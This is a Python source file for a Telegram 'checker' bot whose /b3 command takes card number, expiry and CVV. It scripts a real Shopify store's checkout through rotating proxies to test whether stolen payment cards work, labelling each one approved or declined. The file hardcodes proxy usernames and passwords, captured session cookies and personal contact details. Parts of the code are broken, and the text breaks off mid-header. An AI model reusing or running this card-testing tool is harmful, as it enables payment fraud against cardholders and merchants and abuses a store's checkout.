import requests
from pyrogram import Client
from pyrogram import filters
import time
import asyncio
import aiohttp
import random
from mongoDB import *
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
import os
import re
from aiohttp_proxy import ProxyConnector
import aiohttp
from datetime import datetime
from gates.functions.func_imp import get_time_taken
from gates.functions.func_imp import auto_ext
from gates.functions.func_imp import find_between
from pyrogram import Client, filters
from gates.functions.func_bin import get_bin_info
from gates.functions.func_imp import get_time_taken
from gates.functions.func_esdeath import auto_sho_async
import socket


def ocultar_ip(archivo):
    with open(archivo, 'r') as file:
        contenido = file.read().splitlines()

    for proxy in contenido:
        partes = proxy.split(".")
        partes[-1] = ''
        partes[-3] = '.xxxx'
    return ''.join(partes)



async def verificar_proxies(archivo):
    with open(archivo, 'r') as file:
        contenido = file.read().splitlines()

    for proxy in contenido:
        proxy_ip, proxy_port = proxy.split(":")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.settimeout(5)
        sock.connect((proxy_ip, int(proxy_port)))
        return "Live! ✅"
    except socket.error as err:
        return "Dead! ❌", err
    finally:
        sock.close()
        
archivo = "/storage/emulated/0/Pixel_Chk/proxys.txt"  # Reemplaza con la ruta y nombre de tu archivo de texto
verificar_proxies(archivo)

def find_between( data, first, last ):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None

async def response_sh(textoo):
	if 'Invalid card verification number' in textoo or 'Thank you for your purchase!' in textoo:
		return 'APPROVED ✅'
	
	else:
		return 'DECLINED ❌'

prrox = [
				'http://knlzmqjg-rotate:x6f59q0od485@p.webshare.io:80/',
				'http://wiaevqoy-rotate:8cchty7lq6uz@p.webshare.io:80/',
				'http://ckpqqagy-rotate:tayu9gg6dos6@p.webshare.io:80/',
				'http://urfhspqv-rotate:r7n6p28puxxq@p.webshare.io:80/',
				'http://dqcnwsxr-rotate:wynsge2k4ecm@p.webshare.io:80/',
				'http://cqbxjdwf-rotate:5aj4nh5oh9g1@p.webshare.io:80/',
				'http://yixupsyx-rotate:k0890u62cf0z@p.webshare.io:80/',
				'http://edspwabx-rotate:t2huelcmdc1y@p.webshare.io:80/',
				'http://qwzhhbyc-rotate:y65ea6osrvyh@p.webshare.io:80/',
				'http://tiqzsrum-rotate:4uh17rettfkw@p.webshare.io:80/',
				'http://scoccvnt-rotate:kp30swm1lxp2@p.webshare.io:80/',
				'http://ewrnkwjt-rotate:cb5gvs87u5mp@p.webshare.io:80/',
				'http://sxhgrqjh-rotate:ta7pcilzgw4l@p.webshare.io:80/',
				'http://onrgncdd-rotate:av3wnkjlyg8i@p.webshare.io:80/',
				'http://vrxijuld-rotate:jmcidcidmd9l@p.webshare.io:80/',
				]
			
ssl = random.choice(prrox)
connector = ProxyConnector.from_url(ssl)
client_timeout = aiohttp.ClientTimeout(total=10)
 
@Client.on_message(filters.command('b3',prefixes=['.','!','/',',','-','$','%','#']))
async def b3_(_,message):

    tiempo = time.time()
    

    if message.reply_to_message:
      input = re.findall(r'[0-9]+',str(message.reply_to_message.text))
    else:
      input = re.findall(r'[0-9]+',str(message.text))

    encontrar_usuario = collection.find_one({"_id": message.from_user.id})
    encontrar_comando = collection_cuatro.find_one({"comando": "b3"})

    #
    if encontrar_usuario is None: return await message.reply(text='<b>You are not currently registered in my database. /register</b>',quote=True)

    estado_comando = encontrar_comando.get("estado")
    if estado_comando == "❌":
        return await message.reply(text="""<b>Command: <code>Braintree</code>
Gateway: <code>Braintree Charged $27.48</code>
Estados: <code>❌</code>
Format: <code>/b3 cc|month|year|cvv.</code></b>""")

    encontrar_grupo = collection_tres.find_one({"group": str(message.chat.id)})

    if encontrar_usuario['key'] != 'None' or encontrar_grupo != None:
        if encontrar_usuario['key'] != 'None':
            if encontrar_usuario["key"] < datetime.now():            
                collection.update_one({"_id": message.from_user.id},{"$set": {"key": 'None'}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"antispam": 60}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"plan": 'Free'}})
                return await message.reply(text='<b>your key has expired.</b>',quote=True)
        elif encontrar_grupo["key"] < datetime.now():
            collection_tres.delete_one({"group": str(message.chat.id)})

    else: return await message.reply(text='<b>Contact an administrator to get a key.</b>',quote=True)

    
    alaa = f'''
<b>Command: <code>Braintree</code>
Gateway: <code>Braintree Charged $27.48</code></b>
Estados: <code>✅</code>
Format: <code>/b3 cc|month|year|cvv.</code>
'''
    if len(input) < 4: return await message.reply(text=alaa,quote=True)      

    tiempo_usuario = int(encontrar_usuario["time_user"])
    spam_time = int(time.time()) - tiempo_usuario
    if spam_time < encontrar_usuario['antispam']:
        tiempo_restante = encontrar_usuario['antispam'] - spam_time
        texto_spam = f"""
<b>[ANTI_SPAM_DETECTED] Try again after <code>{tiempo_restante}</code>'s</b> 
    """
        return await Client.send_message(_,chat_id=message.chat.id,text=texto_spam,reply_to_message_id=message.id)

    collection.update_one({"_id": message.from_user.id},{"$set": {"time_user": int(time.time())}})
    ccs = True
    if not ccs:
            await message.reply("Invalid Card")
            return
    data = message.text.split(" ", 2)

    if len(data) < 2:
                await message.reply_text("Invalid Card")
                return
    
    ccs  = data[1]
    card = ccs.split("|")
    cc   = card[0]
    mes  = card[1]
    users = message.from_user.username
    ano = card[2]
    cvv = card[3]
    bin_code = cc[:6]
    x = get_bin_info (cc[0:6])
    
    with open('/storage/emulated/0/Pixel_Chk/proxys.txt') as f:
        lines = f.readlines()
    for proxs in lines:
        ssl =  {'http': f'{proxs}', 'https': f'{proxs}'}
    session = requests.session()
    

    headers = {
    'authority': 'www.sentaifilmworks.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'es-ES,es;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
     #'cookie': 'secure_customer_sig=; localization=US; cart_currency=USD; _y=6b2a62a7-2a3c-4f26-a434-43f2064585d4; _s=39403cf8-0c71-4a2a-87cc-66dc65e37886; _shopify_y=6b2a62a7-2a3c-4f26-a434-43f2064585d4; _shopify_s=39403cf8-0c71-4a2a-87cc-66dc65e37886; _orig_referrer=; _landing_page=%2F; _shopify_sa_p=; _gid=GA1.2.1269029484.1694798871; _fbp=fb.1.1694798871956.652376748; swym-session-id="bxvkg8b8ekq7sf44tfuz29p4zdlos9vzes3n9sybp6byh3t9cw0ntnuqeoul6g97"; swym-pid="vgEWKY6lc8AP8dLF/WSgnUij9XJVYAqEWg5FF7oFL+E="; shopify_pay_redirect=pending; swym-o_s=true; swym-swymRegid="D341ZuBnmYQeMvYMgDXwdSyasz0uW4YR3vpxB9S5gwfwffW-XlnMikI5uzBaEtiddAITZiFODlZ62wxaTwt1VKiPpjQItqeXNn_-VfmzGqdlsTfzBLIVBDBaOEZGD3Yid662QHhHctxZkOYGZBqvkSL137IVV9Shkya-69HU6bQ"; swym-email=null; swym-instrumentMap={}; locale_bar_accepted=1; _shopify_sa_t=2023-09-15T17%3A32%3A22.470Z; _ga_JRR54MDV7Z=GS1.1.1694798870.1.1.1694799142.6.0.0; _ga_Z8HLNN1LY0=GS1.1.1694798871.1.1.1694799142.0.0.0; swym-cu_ct=undefined; cart_sig=cf12aff272a0bb8b9dbcdc44b9722ac6; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22merchant_geo%22%3A%22US%22%2C%22sale_of_data_region%22%3Afalse%7D; keep_alive=f1e92c3b-a6da-44b0-8c23-933c2a348ee2; _ga=GA1.2.997971424.1694798871; _gat_UA-47434300-1=1',
    'origin': 'https://www.sentaifilmworks.com',
    'referer': 'https://www.sentaifilmworks.com/collections/all-products',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'quantity': '1',
    'id': '39356746465383',
}

    req1 = session.post('https://www.sentaifilmworks.com/cart/add.js',headers=headers, data=data)

    req2 = session.get('https://www.sentaifilmworks.com/checkouts/cn/Z2NwLXVzLWNlbnRyYWwxOjAxSkFZRDg4UTAzNE5GUDM3MzhBMDVOTk00')
    
    url = req2.url

    req3 = session.get(url=url)

    texto_1 = req3.text

    token_1 = find_between(texto_1,'input type="hidden" name="authenticity_token" value="','"')

    headers_2 = {
    'authority': 'www.sentaifilmworks.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
     #'cookie': 'checkout=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0TldKaU5XWTJPREJpTURWbE9XSmhOVEExTUdRMU1qWTBaV1F6TmpZMU5nWTZCa1ZVIiwiZXhwIjoiMjAyMy0xMC0wNlQxNzozODoxMS40MDVaIiwicHVyIjoiY29va2llLmNoZWNrb3V0In19--12c1e70f7e448ee356c24508a20d3f2bc28a1ca1; checkout_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0TldKaU5XWTJPREJpTURWbE9XSmhOVEExTUdRMU1qWTBaV1F6TmpZMU5nWTZCa1ZVIiwiZXhwIjoiMjAyMy0xMC0wNlQxNzozODoxMS40MDVaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X2xlZ2FjeSJ9fQ%3D%3D--d96428eb4686c306c75307125de4f2a28640d871; hide_shopify_pay_for_checkout=false; checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0T1ROalpqbGxOVE0xTURVME9HVmtaREkxWVRGbU4yUTBOalUxTVRkaFpBWTZCa1ZVIiwiZXhwIjoiMjAyNC0wOS0xNVQxNzozODoxMS40MDVaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuIn19--d747367bee17f259570e3d5276eac36ebaf3c9df; checkout_token_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0T1ROalpqbGxOVE0xTURVME9HVmtaREkxWVRGbU4yUTBOalUxTVRkaFpBWTZCa1ZVIiwiZXhwIjoiMjAyNC0wOS0xNVQxNzozODoxMS40MDVaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuX2xlZ2FjeSJ9fQ%3D%3D--678dffa7696cb1071ed6e8da151a3cbe0659b14b; tracked_start_checkout=893cf9e5350548edd25a1f7d465517ad; secure_customer_sig=; localization=US; cart_currency=USD; _y=6b2a62a7-2a3c-4f26-a434-43f2064585d4; _s=39403cf8-0c71-4a2a-87cc-66dc65e37886; _shopify_y=6b2a62a7-2a3c-4f26-a434-43f2064585d4; _shopify_s=39403cf8-0c71-4a2a-87cc-66dc65e37886; _orig_referrer=; _landing_page=%2F; _shopify_sa_p=; _gid=GA1.2.1269029484.1694798871; _fbp=fb.1.1694798871956.652376748; swym-session-id="bxvkg8b8ekq7sf44tfuz29p4zdlos9vzes3n9sybp6byh3t9cw0ntnuqeoul6g97"; swym-pid="vgEWKY6lc8AP8dLF/WSgnUij9XJVYAqEWg5FF7oFL+E="; shopify_pay_redirect=pending; swym-o_s=true; swym-swymRegid="D341ZuBnmYQeMvYMgDXwdSyasz0uW4YR3vpxB9S5gwfwffW-XlnMikI5uzBaEtiddAITZiFODlZ62wxaTwt1VKiPpjQItqeXNn_-VfmzGqdlsTfzBLIVBDBaOEZGD3Yid662QHhHctxZkOYGZBqvkSL137IVV9Shkya-69HU6bQ"; swym-email=null; locale_bar_accepted=1; cart=291fab6f3d29d698eadb70df77456147; cart_sig=5a2ecd4d9f3e95d5eace7a1a04b7c86e; swym-cu_ct=undefined; swym-instrumentMap={}; keep_alive=b7dcf4a2-21c4-4f88-bdf0-732f84dc5755; cart_ts=1694799490; _checkout_queue_token=AvWwFwHFQs-ykvB8MWvZn2FFIUinm6kmd1tmuozgkl4YftqQqfdq6UDI58mOnDqNmKacSiCAMd_pmNmdnIrFCjE6l4mmUIDZIRdpbSuwfOKWdfegO8eHOia-Uns1QAWVfHnjJ_DmcSBhPRWf6lpQpKC8V-7waMVhvH9fYR_0RUoBOPw8nPNAeaK4jQ%3D%3D; _checkout_queue_checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0T1ROalpqbGxOVE0xTURVME9HVmtaREkxWVRGbU4yUTBOalUxTVRkaFpBWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0xNVQxODozODoxMS4xMDJaIiwicHVyIjoiY29va2llLl9jaGVja291dF9xdWV1ZV9jaGVja291dF90b2tlbiJ9fQ%3D%3D--dd31c3e79fb09b30c7a5f5dffe29d9686f3970b0; cart_ver=gcp-us-central1%3A2; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22merchant_geo%22%3A%22USUSTX%22%2C%22sale_of_data_region%22%3Afalse%7D; _secure_session_id=b328fcdff73704878d0f108fdeb5ba9e; checkout_session_token__co__893cf9e5350548edd25a1f7d465517ad=%7B%22token%22%3A%22bnZyU2xpcnlIVW4ybVpxemhwNVVJL3NKTVgxWTZNMTdacUZac3crVCtsOFNGcEJBbmhpdFN4VTUzRmJOTUxESWlwcEFOeVU0M2xRV1ROdnRjdlFxNWpNdEx2SFllZmx1Zzh5MXZhYWJ2Yk40ZENXRUdKMTNhRUpiTm1pczEwNGhyRHpaZXpGdUdkNmpBZWdCTHhuaDhJYnRMY3dHUXpBeHAvNmRPSGMzNjB4ZWJPTDVyaXFIS1hQZmZmNzlxVjF2dEIxVUN5OVdnN01Dd0tTUmpYYjZoajM3QVlHMjlPaldLemxhRURxTU1JZWhqNnYwRENRMVdVTWtpU3RBSXB4ZzlSZlMxblU9LS1DM3Zhc0ttbFY0eXJTT0xTLS0vVEt4K080dURWWUNZZ1pxRXl5eG93PT0%22%2C%22locale%22%3A%22en-US%22%7D; checkout_session_lookup=%7B%22version%22%3A1%2C%22keys%22%3A%5B%7B%22source_id%22%3A%22893cf9e5350548edd25a1f7d465517ad%22%2C%22checkout_session_identifier%22%3A%22893cf9e5350548edd25a1f7d465517ad%22%2C%22source_type_abbrev%22%3A%22co%22%2C%22updated_at%22%3A%222023-09-15T17%3A38%3A11.891Z%22%7D%5D%7D; _shopify_sa_t=2023-09-15T17%3A38%3A13.568Z; _gat=1; _ga_JRR54MDV7Z=GS1.1.1694798870.1.1.1694799494.57.0.0; _ga_Z8HLNN1LY0=GS1.1.1694798871.1.1.1694799494.0.0.0; _ga=GA1.2.997971424.1694798871; _gat_UA-47434300-1=1; unique_interaction_id=3e9635a3-e1d9-42fc-4ffb-ad3b4c37b474',
    'origin': 'https://www.sentaifilmworks.com',
    'referer': 'https://www.sentaifilmworks.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
}

    data_1 = f'_method=patch&authenticity_token={token_1}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=santoagoabavhd09%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=Canada&checkout%5Bshipping_address%5D%5Bfirst_name%5D=SANTIAGO&checkout%5Bshipping_address%5D%5Blast_name%5D=tacsuya&checkout%5Bshipping_address%5D%5Baddress1%5D=Streetsville&checkout%5Bshipping_address%5D%5Baddress2%5D=aperteamw222&checkout%5Bshipping_address%5D%5Bcity%5D=Mississauga&checkout%5Bshipping_address%5D%5Bprovince%5D=ON&checkout%5Bshipping_address%5D%5Bzip%5D=L5P+1B2&checkout%5Bshipping_address%5D%5Bphone%5D=%28205%29+815-466&checkout%5Bclient_details%5D%5Bbrowser_width%5D=478&checkout%5Bclient_details%5D%5Bbrowser_height%5D=672&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240'
    
    contra = await message.reply(f"""
<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>

⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", reply_to_message_id=message.id, disable_web_page_preview=True) 
    
    req4 = session.post(url=url,headers=headers_2,data=data_1)

    url_2 = req4.url

    req5 = session.get(url=url_2)

    texto_2 = req5.text

    token_2 = find_between(texto_2,'input type="hidden" name="authenticity_token" value="','"')

    headers_3 = {
    'authority': 'www.sentaifilmworks.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
     #'cookie': 'checkout=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0TldKaU5XWTJPREJpTURWbE9XSmhOVEExTUdRMU1qWTBaV1F6TmpZMU5nWTZCa1ZVIiwiZXhwIjoiMjAyMy0xMC0wNlQxNzozODo0NS45MTJaIiwicHVyIjoiY29va2llLmNoZWNrb3V0In19--252649b346437dee2726c1a2b35d879db6479cf6; checkout_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0TldKaU5XWTJPREJpTURWbE9XSmhOVEExTUdRMU1qWTBaV1F6TmpZMU5nWTZCa1ZVIiwiZXhwIjoiMjAyMy0xMC0wNlQxNzozODo0NS45MTJaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X2xlZ2FjeSJ9fQ%3D%3D--0a487e8e2ac3b007b273243157dc8bf38a7f3c96; hide_shopify_pay_for_checkout=false; tracked_start_checkout=893cf9e5350548edd25a1f7d465517ad; checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0T1ROalpqbGxOVE0xTURVME9HVmtaREkxWVRGbU4yUTBOalUxTVRkaFpBWTZCa1ZVIiwiZXhwIjoiMjAyNC0wOS0xNVQxNzozODo0NS45MTJaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuIn19--88c69a5603f430f4ce033877540dd1551db7f37b; checkout_token_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0T1ROalpqbGxOVE0xTURVME9HVmtaREkxWVRGbU4yUTBOalUxTVRkaFpBWTZCa1ZVIiwiZXhwIjoiMjAyNC0wOS0xNVQxNzozODo0NS45MTJaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuX2xlZ2FjeSJ9fQ%3D%3D--34fb7d9526bc8c86d5924a2158ea7ad564a57450; secure_customer_sig=; localization=US; cart_currency=USD; _y=6b2a62a7-2a3c-4f26-a434-43f2064585d4; _s=39403cf8-0c71-4a2a-87cc-66dc65e37886; _shopify_y=6b2a62a7-2a3c-4f26-a434-43f2064585d4; _shopify_s=39403cf8-0c71-4a2a-87cc-66dc65e37886; _orig_referrer=; _landing_page=%2F; _shopify_sa_p=; _gid=GA1.2.1269029484.1694798871; _fbp=fb.1.1694798871956.652376748; swym-session-id="bxvkg8b8ekq7sf44tfuz29p4zdlos9vzes3n9sybp6byh3t9cw0ntnuqeoul6g97"; swym-pid="vgEWKY6lc8AP8dLF/WSgnUij9XJVYAqEWg5FF7oFL+E="; shopify_pay_redirect=pending; swym-o_s=true; swym-swymRegid="D341ZuBnmYQeMvYMgDXwdSyasz0uW4YR3vpxB9S5gwfwffW-XlnMikI5uzBaEtiddAITZiFODlZ62wxaTwt1VKiPpjQItqeXNn_-VfmzGqdlsTfzBLIVBDBaOEZGD3Yid662QHhHctxZkOYGZBqvkSL137IVV9Shkya-69HU6bQ"; swym-email=null; locale_bar_accepted=1; cart=291fab6f3d29d698eadb70df77456147; cart_sig=5a2ecd4d9f3e95d5eace7a1a04b7c86e; swym-cu_ct=undefined; swym-instrumentMap={}; keep_alive=b7dcf4a2-21c4-4f88-bdf0-732f84dc5755; cart_ts=1694799490; _cmp_a=%7B%22purposes%22%3A%7B%22a%22%3Atrue%2C%22p%22%3Atrue%2C%22m%22%3Atrue%2C%22t%22%3Atrue%7D%2C%22display_banner%22%3Afalse%2C%22merchant_geo%22%3A%22USUSTX%22%2C%22sale_of_data_region%22%3Afalse%7D; _secure_session_id=b328fcdff73704878d0f108fdeb5ba9e; checkout_session_token__co__893cf9e5350548edd25a1f7d465517ad=%7B%22token%22%3A%22bnZyU2xpcnlIVW4ybVpxemhwNVVJL3NKTVgxWTZNMTdacUZac3crVCtsOFNGcEJBbmhpdFN4VTUzRmJOTUxESWlwcEFOeVU0M2xRV1ROdnRjdlFxNWpNdEx2SFllZmx1Zzh5MXZhYWJ2Yk40ZENXRUdKMTNhRUpiTm1pczEwNGhyRHpaZXpGdUdkNmpBZWdCTHhuaDhJYnRMY3dHUXpBeHAvNmRPSGMzNjB4ZWJPTDVyaXFIS1hQZmZmNzlxVjF2dEIxVUN5OVdnN01Dd0tTUmpYYjZoajM3QVlHMjlPaldLemxhRURxTU1JZWhqNnYwRENRMVdVTWtpU3RBSXB4ZzlSZlMxblU9LS1DM3Zhc0ttbFY0eXJTT0xTLS0vVEt4K080dURWWUNZZ1pxRXl5eG93PT0%22%2C%22locale%22%3A%22en-US%22%7D; checkout_session_lookup=%7B%22version%22%3A1%2C%22keys%22%3A%5B%7B%22source_id%22%3A%22893cf9e5350548edd25a1f7d465517ad%22%2C%22checkout_session_identifier%22%3A%22893cf9e5350548edd25a1f7d465517ad%22%2C%22source_type_abbrev%22%3A%22co%22%2C%22updated_at%22%3A%222023-09-15T17%3A38%3A11.891Z%22%7D%5D%7D; _checkout_queue_token=Am4doioZCmaup2VdzY7jC8PhnO15nY7b3CzDFr4-t5v4ZBdrzT4WhYGXKROTu7X2IvkxdzbstqJnOXUErPx-s1zwL9lgnZiMiKI8Ek7-_ciVONHeu7Jl9m01s5uCIyCoYYxjGVhj-Hc2WksvmnqekehzC2COsdpp1aiHZmkbwgGHTGyOaaSjd6e8FQ%3D%3D; _checkout_queue_checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0T1ROalpqbGxOVE0xTURVME9HVmtaREkxWVRGbU4yUTBOalUxTVRkaFpBWTZCa1ZVIiwiZXhwIjoiMjAyMy0wOS0xNVQxODozODo0NS41ODVaIiwicHVyIjoiY29va2llLl9jaGVja291dF9xdWV1ZV9jaGVja291dF90b2tlbiJ9fQ%3D%3D--377c6e654ab4a006fad562a380e0e423da764236; cart_ver=gcp-us-central1%3A3; _shopify_sa_t=2023-09-15T17%3A38%3A47.325Z; _ga_JRR54MDV7Z=GS1.1.1694798870.1.1.1694799527.24.0.0; _ga_Z8HLNN1LY0=GS1.1.1694798871.1.1.1694799527.0.0.0; _ga=GA1.2.997971424.1694798871; _gat_UA-47434300-1=1; unique_interaction_id=a68af20a-ac2e-4c49-191c-0e94464fe617',
    'origin': 'https://www.sentaifilmworks.com',
    'referer': 'https://www.sentaifilmworks.com/',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
}

    data_2 = f'_method=patch&authenticity_token={token_2}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-International%2520Mail%2520%5Bavg%252014-30%2520days%5D-13.49&checkout%5Bclient_details%5D%5Bbrowser_width%5D=863&checkout%5Bclient_details%5D%5Bbrowser_height%5D=759&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=240'

    req6 = session.post(url=url_2,headers=headers_3,data=data_2)

    url_3 = req6.url

    req7 = session.get(url=url_3)

    texto_3 = req7.text

    token_3 = find_between(texto_3,'input type="hidden" name="authenticity_token" value="','"')

    headers = {
    'Accept': 'application/json',
    'Accept-Language': 'es-ES,es;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://checkout.shopifycs.com',
    'Referer': 'https://checkout.shopifycs.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0',
    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Opera GX";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

    json_data = {
    'credit_card': {
        'number': cc,
        'name': 'pangatuqui',
        'month': mes,
        'year': ano,
        'verification_value': cvv,
    },
    'payment_session_scope': 'www.sentaifilmworks.com',
}

    req8 = session.post('https://deposit.us.shopifycs.com/sessions', headers=headers, json=json_data).json()

    idpwnw = req8['id']

    headers_4 = {
    'authority': 'www.sentaifilmworks.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'es-ES,es;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
     #'cookie': 'checkout=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0TldKaU5XWTJPREJpTURWbE9XSmhOVEExTUdRMU1qWTBaV1F6TmpZMU5nWTZCa1ZVIiwiZXhwIjoiMjAyMy0xMC0wNlQxNzo0MTo1Mi4zMTlaIiwicHVyIjoiY29va2llLmNoZWNrb3V0In19--d423a376865140571dc1fc9bed8bec892470b353; checkout_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0TldKaU5XWTJPREJpTURWbE9XSmhOVEExTUdRMU1qWTBaV1F6TmpZMU5nWTZCa1ZVIiwiZXhwIjoiMjAyMy0xMC0wNlQxNzo0MTo1Mi4zMTlaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X2xlZ2FjeSJ9fQ%3D%3D--e55c3bdd58fb99952749273deb77d456034aa7e0; hide_shopify_pay_for_checkout=false; tracked_start_checkout=893cf9e5350548edd25a1f7d465517ad; checkout_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0T1ROalpqbGxOVE0xTURVME9HVmtaREkxWVRGbU4yUTBOalUxTVRkaFpBWTZCa1ZVIiwiZXhwIjoiMjAyNC0wOS0xNVQxNzo0MTo1Mi4zMjBaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuIn19--edc242c0b3076331815e2d8c15d7cc0ded87e371; checkout_token_legacy=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVU0T1ROalpqbGxOVE0xTURVME9HVmtaREkxWVRGbU4yUTBOalUxTVRkaFpBWTZCa1ZVIiwiZXhwIjoiMjAyNC0wOS0xNVQxNzo0MTo1Mi4zMjBaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuX2xlZ2FjeSJ9fQ%3D%3D--729659caaeb7470982597d31441459bc644fa96c; secure_customer_sig=; localization=US; cart_currency=USD; 